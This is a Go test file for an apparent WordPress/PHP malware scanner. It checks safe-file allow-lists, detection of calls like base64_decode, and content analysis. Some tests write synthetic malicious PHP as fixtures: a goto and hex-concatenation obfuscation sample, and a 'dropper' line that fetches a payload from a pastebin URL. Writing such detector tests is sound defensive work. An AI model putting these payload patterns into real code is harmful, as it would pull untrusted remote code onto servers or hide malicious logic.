package checks

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- isSafePHPInWPDir -------------------------------------------------

func TestIsSafePHPInWPDirTranslation(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/languages/en_US.l10n.php", "en_US.l10n.php") {
		t.Error(".l10n.php should be safe")
	}
}

func TestIsSafePHPInWPDirIndex(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/uploads/index.php", "index.php") {
		t.Error("index.php should be safe")
	}
}

func TestIsSafePHPInWPDirLanguagesAdmin(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/languages/admin-en_US.php", "admin-en_US.php") {
		t.Error("admin-* in languages should be safe")
	}
}

func TestIsSafePHPInWPDirLanguagesLocale(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/languages/fr_FR.php", "fr_FR.php") {
		t.Error("locale.php in languages should be safe")
	}
}

func TestIsSafePHPInWPDirMuPlugin(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/mu-plugins/endurance-browser-cache.php", "endurance-browser-cache.php") {
		t.Error("endurance mu-plugin should be safe")
	}
}

func TestIsSafePHPInWPDirPluginVendor(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/plugins/myplugin/vendor/autoload.php", "autoload.php") {
		t.Error("vendor/ in plugins should be safe")
	}
}

func TestIsSafePHPInWPDirUnknown(t *testing.T) {
	if isSafePHPInWPDir("/home/u/public_html/wp-content/uploads/evil.php", "evil.php") {
		t.Error("unknown PHP in uploads should not be safe")
	}
}

// --- containsStandaloneFunc -------------------------------------------
// Tests that function-call detection distinguishes standalone calls
// from calls embedded in longer names (e.g. "doubleval(" vs "eval(").

func TestContainsStandaloneFuncAtStart(t *testing.T) {
	if !containsStandaloneFunc("base64_decode('code');", "base64_decode(") {
		t.Error("standalone call at start should match")
	}
}

func TestContainsStandaloneFuncAfterSpace(t *testing.T) {
	if !containsStandaloneFunc("return base64_decode('code');", "base64_decode(") {
		t.Error("call after space should match")
	}
}

func TestContainsStandaloneFuncEmbedded(t *testing.T) {
	if containsStandaloneFunc("my_base64_decode(x)", "base64_decode(") {
		t.Error("call inside longer name should not match")
	}
}

func TestContainsStandaloneFuncNotPresent(t *testing.T) {
	if containsStandaloneFunc("no such function here", "base64_decode(") {
		t.Error("missing function should not match")
	}
}

// --- containsAny ------------------------------------------------------

func TestContainsAnyPositive(t *testing.T) {
	strs := []string{"first line", "second line with base64"}
	if !containsAny(strs, "base64", "assert") {
		t.Error("should match base64 in second line")
	}
}

func TestContainsAnyNegative(t *testing.T) {
	strs := []string{"first line", "second line"}
	if containsAny(strs, "base64", "assert") {
		t.Error("nothing should match")
	}
}

func TestContainsAnyEmpty(t *testing.T) {
	if containsAny(nil, "base64") {
		t.Error("nil slice should not match")
	}
}

// --- countOccurrences -------------------------------------------------

func TestCountOccurrencesMultiple(t *testing.T) {
	if got := countOccurrences("abc abc abc", "abc"); got != 3 {
		t.Errorf("got %d, want 3", got)
	}
}

func TestCountOccurrencesNone(t *testing.T) {
	if got := countOccurrences("hello world", "xyz"); got != 0 {
		t.Errorf("got %d, want 0", got)
	}
}

func TestCountOccurrencesOverlapping(t *testing.T) {
	// Non-overlapping search: "aa" in "aaa" = 1 (offset advances by len(substr))
	if got := countOccurrences("aaa", "aa"); got != 1 {
		t.Errorf("got %d, want 1", got)
	}
}

// --- analyzePHPContent ------------------------------------------------

func TestAnalyzePHPContentGotoObfuscation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "obf.php")
	// 15+ goto statements triggers "excessive goto" indicator.
	// Two indicators (goto + hex concat) triggers Critical severity.
	var gotos string
	for i := 0; i < 20; i++ {
		gotos += "goto lbl" + strings.Repeat("a", i) + "; lbl" + strings.Repeat("a", i) + ":\n"
	}
	content := "<?php\n" + gotos +
		strings.Repeat("\"\\x63\" . \"\\x75\" . ", 15) + "\"\";\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Errorf("expected non-empty check for obfuscated PHP, got %+v", result)
	}
}

func TestAnalyzePHPContentRemotePayload(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "dropper.php")
	content := "<?php\n$payload = file_get_contents('https://pastebin.com/raw/abc123');\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Errorf("expected detection for remote payload URL, got %+v", result)
	}
}

func TestAnalyzePHPContentClean(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "clean.php")
	content := "<?php\necho 'Hello World';\nfunction add($a, $b) { return $a + $b; }\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("clean PHP should not flag, got check=%q message=%q", result.check, result.message)
	}
}

func TestAnalyzePHPContentMissing(t *testing.T) {
	result := analyzePHPContent(filepath.Join(t.TempDir(), "nope.php"))
	if result.check != "" {
		t.Errorf("missing file should return empty, got check=%q", result.check)
	}
}

func TestAnalyzePHPContentEmpty(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.php")
	_ = os.WriteFile(path, []byte(""), 0644)
	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("empty file should return empty, got check=%q", result.check)
	}
}
